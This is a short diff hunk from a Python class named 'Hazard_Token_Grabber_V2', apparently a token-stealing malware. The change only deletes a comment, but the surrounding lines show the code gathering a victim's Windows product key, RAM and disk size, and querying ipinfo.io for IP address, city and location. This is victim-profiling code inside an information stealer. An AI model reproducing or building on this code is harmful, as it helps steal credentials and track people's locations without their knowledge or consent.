@@ -495,7 +495,6 @@ class Hazard_Token_Grabber_V2(functions):
         wkey = w[1].replace(" ", "᠎ ")
         ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
         disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
-        # IP, country, city, region, google maps location
         data = httpx.get("https://ipinfo.io/json").json()
         ip = data.get('ip')
         city = data.get('city')
